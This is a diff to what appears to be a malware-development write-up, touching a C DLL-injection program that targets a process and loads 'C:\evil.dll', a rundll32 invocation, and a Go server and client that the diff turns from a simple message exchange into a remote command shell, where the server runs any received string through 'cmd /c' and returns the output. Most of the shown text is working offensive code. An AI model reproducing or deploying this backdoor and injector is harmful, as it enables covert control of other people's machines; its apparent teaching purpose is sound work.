@@ -221,7 +221,7 @@ rundll32.exe c:\\evil.dll,DllMain
 #include <windows.h>
 #include <tlhelp32.h>
 
-char evilDLL[] = "C:\\evil.dll";
+char evilDLL[] = "C:\\\\evil.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
 
 int main(int argc, char* argv[]) {
@@ -273,7 +273,7 @@ x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -s -ffunctio
 #include <windows.h>
 #include <tlhelp32.h>
 
-char evilDLL[] = "C:\\evil.dll";
+char evilDLL[] = "C:\\\\evil.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
 
 int main(int argc, char* argv[]) {
@@ -474,11 +474,19 @@ import (
 	"encoding/gob" // Package for encoding and decoding data
 	"fmt"          // Package for formatted I/O
 	"net"          // Package for network operations
+	"os/exec"      // Package for executing commands
+	"strings"      // Package for string operations
 )
 
 // Message represents the structure of the message received from the client
 type Message struct {
-	Content string // Content field holds the actual message content
+	Content string // Command field holds the command to be executed
+}
+
+// Response represents the structure of the response message to be sent to the client
+type Response struct {
+	Output       string // Output field holds the command execution output
+	ErrorMessage string // ErrorMessage field holds the error message, if any
 }
 
 // handleConnection is a function that handles the communication with a client connection
@@ -486,17 +494,45 @@ func handleConnection(conn net.Conn) {
 	// Create a decoder to decode the binary data received from the client connection
 	decoder := gob.NewDecoder(conn)
 
-	// Create a new empty message to hold the decoded message content
-	var message Message
+	// Create an encoder to encode the response message and send it back to the client
+	encoder := gob.NewEncoder(conn)
 
-	// Decode the message received from the client into the message variable
-	err := decoder.Decode(&message)
-	if err != nil {
-		fmt.Println("Error decoding message:", err)
-		return
+	for {
+		// Create a new empty message to hold the decoded message content
+		var message Message
+
+		// Decode the message received from the client into the message variable
+		err := decoder.Decode(&message)
+		if err != nil {
+			fmt.Println("Error decoding message:", err)
+			break
+		}
+
+		fmt.Println("Received command:", message.Content) // Print the received command
+
+		// Create a response message with empty output and error message fields
+		response := Response{}
+
+		// Execute the command and capture the output and error streams
+		cmd := exec.Command("cmd", "/c", message.Content)
+		output, err := cmd.Output()
+		if err != nil {
+			response.ErrorMessage = err.Error()
+		}
+		response.Output = string(output)
+
+		// Send the response message back to the client
+		err = encoder.Encode(response)
+		if err != nil {
+			fmt.Println("Error encoding response:", err)
+			break
+		}
+
+		// Check if the client wants to exit
+		if strings.ToLower(message.Content) == "exit" {
+			break
+		}
 	}
-
-	fmt.Println("Received message:", message.Content) // Print the received message content
 
 	conn.Close() // Close the connection with the client
 }
@@ -772,18 +808,27 @@ Using Ghidra to find the DLL's exported function offset (this helped a lot in de
 package main
 
 import (
+	"bufio"        // Package for buffered I/O
 	"encoding/gob" // Package for encoding and decoding data
 	"fmt"          // Package for formatted I/O
 	"net"          // Package for network operations
+	"os"           // Package for OS functions
+	"strings"      // Package for string operations
 )
 
-// Message represents the structure of the message sent from the client to the server
+// Message represents the structure of the message to be sent to the server
 type Message struct {
-	Content string // Content field holds the actual message content
+	Content string // Command field holds the command to be executed
+}
+
+// Response represents the structure of the response received from the server
+type Response struct {
+	Output       string // Output field holds the command execution output
+	ErrorMessage string // ErrorMessage field holds the error message, if any
 }
 
 func main() {
-	// Establish a connection to the server at "localhost:1234" using TCP protocol
+	// Connect to the server at TCP address "localhost:1234"
 	conn, err := net.Dial("tcp", "localhost:1234")
 	if err != nil {
 		fmt.Println("Error connecting to server:", err)
@@ -791,20 +836,58 @@ func main() {
 	}
 	defer conn.Close() // Close the connection before exiting the main function
 
-	// Create an encoder to encode Go values into a binary format to be sent over the network connection
+	// Create an encoder to encode the message and send it to the server
 	encoder := gob.NewEncoder(conn)
 
-	// Create a new message with the content "Hello, server!"
-	message := Message{"Hello, server!"}
+	// Create a decoder to decode the response received from the server
+	decoder := gob.NewDecoder(conn)
 
-	// Encode the message and send it to the server through the connection
-	err = encoder.Encode(message)
-	if err != nil {
-		fmt.Println("Error encoding message:", err)
-		return
+	// Create a scanner to read user input from the standard input
+	scanner := bufio.NewScanner(os.Stdin)
+
+	for {
+		fmt.Print("Gob-Client> (type 'exit' to quit): ")
+		scanner.Scan()
+		command := scanner.Text()
+
+		// Create a message with the user input command
+		message := Message{
+			Content: command,
+		}
+
+		// Encode and send the message to the server
+		err = encoder.Encode(message)
+		if err != nil {
+			fmt.Println("Error encoding message:", err)
+			break
+		}
+
+		// Check if the user wants to exit
+		if strings.ToLower(command) == "exit" {
+			break
+		}
+
+		// Create an empty response to hold the decoded response from the server
+		var response Response
+
+		// Decode the response received from the server into the response variable
+		err = decoder.Decode(&response)
+		if err != nil {
+			fmt.Println("Error decoding response:", err)
+			break
+		}
+
+		// Print the server response
+		if response.ErrorMessage != "" {
+			fmt.Println("Server response:", response.ErrorMessage)
+		} else {
+			fmt.Println("Server response:\n\n", response.Output)
+		}
 	}
 
-	fmt.Println("Message sent to server:", message.Content) // Print the message content sent to the server
+	if scanner.Err() != nil {
+		fmt.Println("Error reading user input:", scanner.Err())
+	}
 }
 ```  
 
